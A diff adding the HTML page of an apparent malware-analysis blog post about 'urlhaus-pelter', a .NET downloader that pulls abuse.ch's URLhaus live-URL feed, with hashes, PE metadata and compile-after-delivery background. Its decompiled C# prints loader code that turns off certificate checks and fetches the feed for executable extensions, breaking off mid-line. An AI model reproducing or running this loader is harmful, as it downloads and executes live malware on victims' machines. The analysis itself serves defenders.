@@ -1,0 +1,1112 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A 6.5 KB .NET console binary that reads the public URLhaus text_online live-URL feed, filters it to 21 extensions, and launches every matching URL under %TEMP%\7413374368\. Surfaced by a false-colocation pivot in my daily opendir brief. The family has around 40 compile-time twins on VirusTotal, prior art dating to May 2023, and no public name.">
+      
+      
+        <meta name="author" content="V0lundr">
+      
+      
+        <link rel="canonical" href="https://v0lundr.github.io/blog/urlhaus-pelter-dotnet-downloader/">
+      
+      
+        <link rel="prev" href="../anarchy-in-the-uk-dcrat-python-loader/">
+      
+      
+      
+        
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>urlhaus-pelter: An Undocumented .NET Downloader That Executes the Entire URLhaus Live Feed - V0lundr</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="amber">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#urlhaus-pelter-an-undocumented-net-downloader-that-executes-the-entire-urlhaus-live-feed" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+<header class="site-header">
+  <div class="site-header__inner">
+
+    <!-- Left: handle -->
+    <a href="https://v0lundr.github.io/" class="site-header__logo">
+      // theUnattributed
+    </a>
+
+    <!-- Centre: nav links -->
+    <nav class="site-header__nav">
+      <a href="https://v0lundr.github.io/" class="site-header__link ">Home</a>
+      <a href="https://v0lundr.github.io/about/" class="site-header__link ">About</a>
+    </nav>
+
+    <!-- Right: search -->
+    <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  </div>
+</header>
+
+<style>
+  /* ── KILL DEFAULT HEADER & TABS ─────────────────────────── */
+  .md-header { display: none !important; }
+  .md-tabs   { display: none !important; }
+
+  /* ── CUSTOM HEADER ──────────────────────────────────────── */
+
+  .site-header {
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    background: rgba(7,9,15,0.95);
+    border-bottom: 1px solid #1e2535;
+    backdrop-filter: blur(12px);
+  }
+
+  .site-header__inner {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 2rem;
+    height: 52px;
+    display: flex;
+    align-items: center;
+    gap: 2rem;
+  }
+
+  /* Handle / logo */
+  .site-header__logo {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.85rem;
+    font-weight: 400;
+    letter-spacing: 0.06em;
+    color: #e8a84c;
+    text-decoration: none;
+    white-space: nowrap;
+    flex-shrink: 0;
+  }
+
+  /* Nav links */
+  .site-header__nav {
+    display: flex;
+    align-items: center;
+    gap: 0.25rem;
+    flex: 1;
+  }
+
+  .site-header__link {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.68rem;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: #8898b0;
+    text-decoration: none;
+    padding: 0.3rem 0.7rem;
+    border-radius: 2px;
+    transition: color 0.15s, background 0.15s;
+  }
+
+  .site-header__link:hover {
+    color: #e8a84c;
+    background: rgba(232,168,76,0.06);
+  }
+
+  .site-header__link.active {
+    color: #e8a84c;
+  }
+
+  /* Search — override Material defaults to fit our bar */
+  .md-search {
+    flex-shrink: 0;
+  }
+
+  .md-search__form {
+    background: #0d1119 !important;
+    border: 1px solid #1e2535 !important;
+    border-radius: 2px !important;
+    height: 32px !important;
+    width: 200px !important;
+  }
+
+  .md-search__form:focus-within {
+    border-color: #e8a84c !important;
+    width: 280px !important;
+    transition: width 0.2s ease;
+  }
+
+  .md-search__input {
+    font-family: 'JetBrains Mono', monospace !important;
+    font-size: 0.75rem !important;
+    color: #c8d0de !important;
+  }
+
+  .md-search__input::placeholder {
+    color: #5a6478 !important;
+  }
+
+  .md-search__icon {
+    color: #5a6478 !important;
+  }
+
+  /* Offset page content so sticky header doesn't overlap */
+  .md-main {
+    padding-top: 0 !important;
+  }
+
+  @media (max-width: 600px) {
+    .site-header__logo { display: none; }
+    .md-search__form { width: 140px !important; }
+  }
+</style>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    document.querySelectorAll("a").forEach(function (link) {
+      if (link.textContent.trim() === "Back to index") {
+        link.setAttribute("href", "/");
+      }
+    });
+  });
+</script>
+
+
+<footer class="site-footer-custom">
+  <div class="site-footer-inner">
+    <span class="footer-note">v0lundr.github.io · TLP:WHITE</span>
+    <div class="footer-links">
+      <a href="https://github.com/V0lundr" target="_blank" rel="noopener">GitHub</a>
+      <a href="/feed_rss_created.xml" target="_blank" rel="noopener">RSS</a>
+    </div>
+  </div>
+</footer>
+
+<style>
+  /* Hide default Material footer */
+  .md-footer { display: none !important; }
+
+  .site-footer-custom {
+    border-top: 1px solid #1e2535;
+    background: #07090f;
+    padding: 1.5rem 0;
+  }
+
+  .site-footer-inner {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 2rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 1rem;
+  }
+
+  .footer-note {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    color: #5a6478;
+    letter-spacing: 0.06em;
+  }
+
+  .footer-links {
+    display: flex;
+    gap: 1.5rem;
+  }
+
+  .footer-links a {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: #5a6478;
+    text-decoration: none;
+    transition: color 0.15s;
+  }
+
+  .footer-links a:hover { color: #e8a84c; }
+</style>
+
+
+
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../about/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="V0lundr" class="md-nav__button md-logo" aria-label="V0lundr" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    V0lundr
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    About
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+<nav class="md-nav md-nav--secondary" aria-label="Contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Summary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Takeaways
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#background" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#how-this-sample-surfaced" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How This Sample Surfaced
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-sample-a-6656-byte-net-console-binary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The Sample: A 6,656-byte .NET Console Binary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#walk-the-il" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walk the IL
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-runs-on-detonation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What Runs on Detonation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#how-the-family-ships" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How the Family Ships
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attribution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attribution
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detection-and-mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection and Mitigation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#indicators-of-compromise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Indicators of Compromise
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitre-attck-mapping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MITRE ATT&amp;CK Mapping
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href="../" class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
+                        <time datetime="2026-10-15 00:00:00+00:00" class="md-ellipsis">2026-10-15</time>
+                      </div>
+                    </li>
+                    
+                    
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 3v15h3V3zm3 2 4 13 3-1-4-13zM5 5v13h3V5zM3 19v2h18v-2z"/></svg>
+                          <span class="md-ellipsis">
+                            in
+                            
+                              <a href="../category/malware-analysis/">Malware Analysis</a></span>
+                        </div>
+                      </li>
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
+                          <span class="md-ellipsis">
+                            
+                              9 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
+          
+        </div>
+      </div>
+    </div>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+
+
+<h1 id="urlhaus-pelter-an-undocumented-net-downloader-that-executes-the-entire-urlhaus-live-feed">urlhaus-pelter: An Undocumented .NET Downloader That Executes the Entire URLhaus Live Feed<a class="headerlink" href="#urlhaus-pelter-an-undocumented-net-downloader-that-executes-the-entire-urlhaus-live-feed" title="Permanent link">&para;</a></h1>
+<h2 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">&para;</a></h2>
+<p>While working on an unrelated compromised-opendir case, my daily opendir brief surfaced a .NET console binary as a top hash on the host pivot. Once I pulled it from VirusTotal and read the IL, the sample turned out to be interesting on its own terms. It reads the public URLhaus <code>text_online</code> live-URL feed from abuse.ch,<sup id="fnref:3"><a class="footnote-ref" href="#fn:3">1</a></sup> filters the feed to malware-adjacent extensions, downloads each match into <code>%TEMP%\7413374368\</code>, and launches it with <code>Process.Start</code>. The compiled sample is byte-equivalent to a May 2023 C# source file that still circulates as part of a <code>compile.bat</code> + <code>loader.txt</code> ZIP delivery pattern. In this post I refer to it as <strong>urlhaus-pelter</strong>.</p>
+<!-- more -->
+
+<h2 id="key-takeaways">Key Takeaways<a class="headerlink" href="#key-takeaways" title="Permanent link">&para;</a></h2>
+<ul>
+<li>The loader uses abuse.ch's own live-URL feed as its payload broker. A single run on a current Windows host will download and execute every binary- or script-type URL that abuse.ch is tracking at that moment.</li>
+<li>The pattern is at least two and a half years old. Internal datestamps in the parent ZIP place the source at May 2023, and a simpler sibling variant is dated June 2023. The compiled 2026 sample is byte-identical to the May 2023 source.</li>
+<li>The documented delivery pattern on VirusTotal is a ~1 KB ZIP with <code>compile.bat</code> + <code>loader.txt</code> that compiles the C# source on the victim using Microsoft's own <code>csc.exe</code>.<sup id="fnref3:1"><a class="footnote-ref" href="#fn:1">2</a></sup> The ZIP pattern is one confirmed pathway. I do not have provenance for how any specific operator actually seeds the compiled binary onto a target.</li>
+</ul>
+<h2 id="background">Background<a class="headerlink" href="#background" title="Permanent link">&para;</a></h2>
+<p>Compile-after-delivery is an old LOLBin technique: an operator ships C# or VB.NET source as a plain text file inside a tiny ZIP, a batch file invokes Microsoft's signed <code>csc.exe</code> (or <code>vbc.exe</code>) on the victim to compile that source into a new, locally-produced PE, and the batch runs the result. The PE never traverses the network and never exists on any VirusTotal corpus until a defender finds it and uploads it. MITRE catalogues it as T1127.002 (Trusted Developer Utilities Proxy Execution: Compile After Delivery).<sup id="fnref:1"><a class="footnote-ref" href="#fn:1">2</a></sup> It has been seen in use by BatLoader and other commodity-crime families.<sup id="fnref:2"><a class="footnote-ref" href="#fn:2">3</a></sup></p>
+<p>The novelty in the sample below is not the compile-after-delivery wrapper but what the compiled binary does. Rather than embedding a payload, it treats abuse.ch's public URLhaus live-URL feed<sup id="fnref2:3"><a class="footnote-ref" href="#fn:3">1</a></sup> as its payload broker, pulling the feed at runtime and executing every URL whose extension looks locally runnable. URLhaus is the defender resource of record for tracking malware distribution URLs, maintained by abuse.ch as a free public service; it is a feed defenders depend on and that this loader turns inside out.</p>
+<h2 id="how-this-sample-surfaced">How This Sample Surfaced<a class="headerlink" href="#how-this-sample-surfaced" title="Permanent link">&para;</a></h2>
+<p>My daily opendir hunt had flagged a Somali Police Force potentially compromised web directory that was serving a mix of commodity malware like StealC v2. </p>
+<figure>
+  <img src="../images/Pasted image 20261015142005.png" alt="Somali Police Force Open Directory Serving Commodity Malware">
+  <figcaption>Figure 1: Somali Police Force Open Directory Serving Commodity Malware.</figcaption>
+</figure>
+
+<p>When I pulled VirusTotal's host-pivot for that domain, one of the top hashes was a .NET console binary labelled <code>loader.exe</code>.</p>
+<h2 id="the-sample-a-6656-byte-net-console-binary">The Sample: A 6,656-byte .NET Console Binary<a class="headerlink" href="#the-sample-a-6656-byte-net-console-binary" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>fa0fa9fc7935347c38d2f8a5b04f24bbf4d308396bfd7ef1f6fb10fc5c163272  SHA-256
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>416c211df8184bfe3c6bd33b598eba36f4353cb8                          SHA-1
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>8dbe39c03d57bfd568e078eb3d95741c                                  MD5
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>6,656 bytes                                                        size
+</span></code></pre></div>
+<p>The sample is a PE32 i386 .NET console assembly with three sections and a single linked DLL (<code>mscoree.dll</code>, which is standard for a .NET entry stub).</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Compiler</td>
+<td>.NET Framework 4.x / Mono</td>
+</tr>
+<tr>
+<td>TimeDateStamp</td>
+<td><code>0x6aa5cb68</code> (Sat 2026-09-12 22:00:08 UTC)</td>
+</tr>
+<tr>
+<td>Imphash</td>
+<td><code>f34d5f2d4577ed6d9ceec516c1f5a744</code> (generic .NET single-import)</td>
+</tr>
+<tr>
+<td>Subsystem</td>
+<td>3 (Windows console)</td>
+</tr>
+<tr>
+<td>ImageBase</td>
+<td><code>0x400000</code></td>
+</tr>
+<tr>
+<td>Entrypoint</td>
+<td><code>0x2e5e</code> (RVA)</td>
+</tr>
+<tr>
+<td>AssemblyVersion</td>
+<td><code>0.0.0.0</code> (unset)</td>
+</tr>
+</tbody>
+</table>
+<p>No packing, no obfuscation, no runtime decryption. The IL decompiles directly with ILSpy in about a second.</p>
+<figure>
+  <img src="../images/Pasted image 20261015142345.png" alt="ILSpy Decompiled loader.exe">
+  <figcaption>Figure 2: ILSpy Decompiled loader.exe.</figcaption>
+</figure>
+<h2 id="walk-the-il">Walk the IL<a class="headerlink" href="#walk-the-il" title="Permanent link">&para;</a></h2>
+<p>The sample has one class, <code>Program</code>, with one method, <code>Main</code>, and one compiler-generated lambda used as the TLS validation callback. Everything of interest is in <code>Main</code>. Cleaned up for readability:</p>
+<div class="language-csharp highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">public</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="k">void</span><span class="w"> </span><span class="nf">Main</span><span class="p">()</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="p">{</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">    </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Downloading files, please wait...&quot;</span><span class="p">);</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">    </span><span class="n">ServicePointManager</span><span class="p">.</span><span class="n">SecurityProtocol</span><span class="w"> </span><span class="o">=</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">        </span><span class="n">SecurityProtocolType</span><span class="p">.</span><span class="n">Tls</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">SecurityProtocolType</span><span class="p">.</span><span class="n">Tls11</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">SecurityProtocolType</span><span class="p">.</span><span class="n">Tls12</span><span class="p">;</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">    </span><span class="n">ServicePointManager</span><span class="p">.</span><span class="n">ServerCertificateValidationCallback</span><span class="w"> </span><span class="o">=</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">        </span><span class="p">(</span><span class="n">sender</span><span class="p">,</span><span class="w"> </span><span class="n">cert</span><span class="p">,</span><span class="w"> </span><span class="n">chain</span><span class="p">,</span><span class="w"> </span><span class="n">policy</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="k">true</span><span class="p">;</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="w">    </span><span class="n">WebClient</span><span class="w"> </span><span class="n">wc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">WebClient</span><span class="p">();</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="w">    </span><span class="kt">string</span><span class="p">[]</span><span class="w"> </span><span class="n">feed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">wc</span><span class="p">.</span><span class="n">DownloadString</span><span class="p">(</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="w">        </span><span class="s">&quot;https://urlhaus.abuse.ch/downloads/text_online/&quot;</span><span class="p">).</span><span class="n">Split</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="w">    </span><span class="n">wc</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="w">    </span><span class="kt">string</span><span class="p">[]</span><span class="w"> </span><span class="n">exts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="w">        </span><span class="s">&quot;.exe&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.msi&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.scr&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.ps1&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.bat&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.cmd&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.com&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.lnk&quot;</span><span class="p">,</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="w">        </span><span class="s">&quot;.vbs&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.vbe&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.vb&quot;</span><span class="p">,</span><span class="w">  </span><span class="s">&quot;.js&quot;</span><span class="p">,</span><span class="w">  </span><span class="s">&quot;.jse&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.jar&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.doc&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.docx&quot;</span><span class="p">,</span>
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="w">        </span><span class="s">&quot;.xlsx&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.xls&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.pdf&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.html&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.hta&quot;</span>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="w">    </span><span class="p">};</span>
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="w">    </span><span class="n">List</span><span class="o">&lt;</span><span class="kt">string</span><span class="o">&gt;</span><span class="w"> </span><span class="n">urls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">feed</span><span class="p">.</span><span class="n">Where</span><span class="p">(</span><span class="n">l</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">exts</span><span class="p">.</span><span class="n">Any</span><span class="p">(</span><span class="n">e</span><span class="w"> </span><span class="o">=&gt;</span>
